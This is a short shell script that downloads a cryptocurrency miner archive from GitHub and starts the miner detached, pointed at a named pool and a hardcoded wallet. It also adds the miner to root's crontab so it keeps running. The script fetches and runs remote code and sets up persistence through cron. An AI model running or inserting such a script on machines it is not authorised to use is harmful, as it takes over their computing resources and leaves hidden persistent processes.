wget https://github.com/depresto/EXP/raw/master/expminer.tar.gz
tar -zxvf expminer.tar.gz

echo "./ethdcrminer64 -epool ebit4fun.com:8008 -ewal 0x668fa3e3295b819bbd18d73bc3c096385e503ee3 -epsw x -r 1 -wd 1 -allcoins 1 -eworker $WORKER" > ./expminer/darkmine/start.bash
#echo "setsid ./darkmine/ethdcrminer64 -epool ebit4fun.com:8008 -ewal 0x668fa3e3295b819bbd18d73bc3c096385e503ee3 -epsw x -r 1 -wd 1 -allcoins 1 -eworker $WORKER >> ~/mine.log 2>&1 < /dev/null &" >> ./expminer/startup-miner.sh
DIR=$(pwd)
setsid $DIR/expminer/darkmine/start.bash > $DIR/mine.log 2>&1 < /dev/null

sudo crontab -l > mycron
echo "setsid $DIR/expminer/darkmine/start.bash > $DIR/mine.log 2>&1 < /dev/null" >> mycron
sudo crontab mycron
sudo rm mycron
